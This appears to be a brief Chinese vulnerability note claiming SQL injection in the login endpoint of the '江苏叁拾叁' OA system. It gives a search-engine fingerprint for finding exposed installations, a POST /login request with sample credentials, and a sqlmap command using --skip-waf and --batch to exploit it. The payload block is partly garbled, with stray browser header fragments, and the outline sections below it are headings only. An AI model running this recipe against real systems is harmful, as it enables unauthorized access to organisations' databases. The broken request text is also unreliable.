# 江苏叁拾叁OA存在sql注入

- **系统**：江苏叁拾叁　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="江苏叁拾叁-OA"`
- **请求**：`POST /login HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Content-Length: 23`　`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
Chrome/92.0.4515.131 Safari/537.36
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,applic
ation/signed-exchange;v=b3;q=0.9
Cookie: JSESSIONID=AD52C9F9D7D46303431351876BBA1536
username=1&password=1
sqlmap
sqlmap -r 1.txt  --skip-waf --batch
```

**其他**
- 江苏叁拾叁 OA 存在 sql 注入: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 江苏叁拾叁-OA